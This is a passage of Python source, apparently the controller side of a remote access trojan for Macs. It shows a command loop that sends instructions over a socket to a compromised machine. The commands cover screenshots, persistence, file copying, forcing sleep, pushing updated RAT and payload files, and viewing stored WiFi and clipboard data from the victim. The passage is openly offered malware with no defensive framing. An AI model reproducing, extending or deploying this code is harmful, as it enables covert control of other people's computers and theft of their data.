            print("Saved Processes Information To " + path)
    elif command == "remove_rat":
        uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Are You Sure You Want To Remove The RAT y/n?\n").lower()
        if ("y" or "yes") in uinput:
            print(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] This Will Remove The RAT Causing You To No Longer Have Access To The Clients Mac.")
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Continue y/n?\n")
            if ("y" or "yes") in uinput:
                uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Are You Really Sure y/n?\n")
                if ("y" or "yes") in uinput:
                    conn.send(command.encode())
                    data = conn.recv(b_size).decode()
                    print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Successfully Removed " + data)
                    time.sleep(.5)
                    conn.close()
                    s.close()
                uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Restart Server y/n?\n").lower()
                if ("y" or 'yes') in uinput:
                    print(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Restarting Server...")
                    time.sleep(.5)
                    os.execl(sys.executable, sys.executable, *sys.argv)
                else:
                    quit()
    elif command == "screenshot":
        screenshot()
    elif command == "soundboard":
        soundboard()
    elif command == "caffeinate":
        conn.send(command.encode())
        uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] How Many Seconds: ")
        conn.send(uinput.encode())
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Successfully Caffeinated {username_data}'s Mac For {uinput}s. ")
    elif command == "uncaffeinate":
        conn.send(command.encode())
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Uncaffeinated {username_data}'s Mac.")
    elif command == "persist":
        conn.send(command.encode())
        bool_data = conn.recv(b_size).decode()
        print(f"Persistence Status: {bool_data}")
    elif command == "unpersist":
        conn.send(command.encode())
        bool_data = conn.recv(b_size).decode()
        print(f"Persistence Status: {bool_data}")
    elif command == "update":
        try:
            conn.send(command.encode())
            cwd = os.getcwd()
            print("Current Working Directory: " + cwd)
            uinput_1 = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Please Enter The Directory Which The Updated File Is: ")
            uinput_2 = cwd + uinput_1
            updated_file = open(uinput_2, 'r')
            data = updated_file.read()
            print(data)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Are You Sure You Want To Use This File y/n?\n")
            if ("y" or "yes") in uinput:
                conn.sendall(data.encode())
                time.sleep(.5)
                print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}+{Fore.LIGHTBLUE_EX}] Updating RAT...")
                print(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Restarting...")
                conn.close()
                s.close()
                time.sleep(.5)
                os.execl(sys.executable, sys.executable, *sys.argv)
            else:
                conn.send("quit".encode())
                pass
        except Exception as Error5:
            print("An Error Has Occured: " + str(Error5))
            conn.send("quit".encode())
    elif command == "copy":
        conn.send(command.encode())
        user_input = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter Directory: ")
        conn.send(user_input.encode())
        data = conn.recv(b_size).decode()
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Copied Files Directory Result: {data}")
    elif command == "sleep":
        conn.send(command.encode())
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Sleeping {username_data}'s Computer.")
    elif command == "saved_info":
        if not saved_info:
            print("There Is No Saved Info. WiFi, Clipboard Data Would Be Stored Here.")
        else:
            print("---Saved Info---\n", saved_info)
    elif command == "update_payload":
        try:
            conn.send(command.encode())
            cwd = os.getcwd()
            print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Current Working Directory: " + cwd)
            uinput_1 = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}{Fore.LIGHTBLUE_EX}]Please Enter The Directory Which The Updated File Is: ")
            uinput_2 = cwd + uinput_1
            updated_file = open(uinput_2, 'r')
            data = updated_file.read()
            print(data)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}]Are You Sure You Want To Use This File y/n?\n")
            if ("y" or "yes") in uinput:
                conn.send(data.encode())
                print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}+{Fore.LIGHTBLUE_EX}] Updating Payload2...")
                time.sleep(.5)
                conn.close()
                s.close()
                print(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Restarting...")
                time.sleep(.5)
                os.execl(sys.executable, sys.executable, *sys.argv)
            else:
                conn.send("quit".encode())
                pass
        except Exception as Error5:
            print("An Error Has Occured: " + str(Error5))
            conn.send("quit".encode())
    else:
        print("Command Not Recognized Please Use 'Help' For More Command Options ")
